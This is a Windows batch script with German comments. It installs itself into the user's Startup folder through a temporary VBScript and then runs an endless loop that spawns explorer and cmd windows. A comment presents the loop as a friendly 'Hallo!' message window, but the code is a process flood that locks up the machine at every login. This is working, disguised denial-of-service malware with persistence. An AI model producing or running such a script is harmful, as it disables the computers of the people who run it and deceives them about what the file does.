@echo off
:: Pfad zum Autostart-Ordner definieren
set "autostart_folder=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "shortcut_name=HalloNachricht.lnk"

:: Prüfen, ob die Verknüpfung im Autostart schon existiert
if not exist "%autostart_folder%\%shortcut_name%" (
    
    :: Ein temporäres VBScript erstellen, das die Verknüpfung generiert
    echo set WshShell = WScript.CreateObject("WScript.Shell") > "%temp%\MakeShortcut.vbs"
    echo set oShellLink = WshShell.CreateShortcut("%autostart_folder%\%shortcut_name%") >> "%temp%\MakeShortcut.vbs"
    echo oShellLink.TargetPath = "%~dpnx0" >> "%temp%\MakeShortcut.vbs"
    echo oShellLink.WorkingDirectory = "%~dp0" >> "%temp%\MakeShortcut.vbs"
    echo oShellLink.Save >> "%temp%\MakeShortcut.vbs"
    
    :: Das VBScript ausführen und danach löschen
    cscript //nologo "%temp%\MakeShortcut.vbs"
    del "%temp%\MakeShortcut.vbs"
)

:: ==========================================
:: DER CODE FÜR DAS "HALLO!" FENSTER
:: ==========================================

:top
explorer
start explorer
start cmd
start explorer
start cmd
start explorer
start cmd
goto top
